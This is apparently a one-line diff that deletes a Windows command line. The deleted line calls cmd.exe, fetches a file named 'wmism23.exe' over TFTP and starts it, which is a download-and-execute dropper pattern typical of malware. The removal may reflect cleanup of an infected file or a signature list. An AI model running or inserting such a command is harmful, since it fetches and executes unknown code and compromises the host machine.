@@ -1,1 +1,0 @@
-%systemroot%\system32\cmd.exetftp -i 0.0.0.0 get wmism23.exe& start wmism23.exe& exit
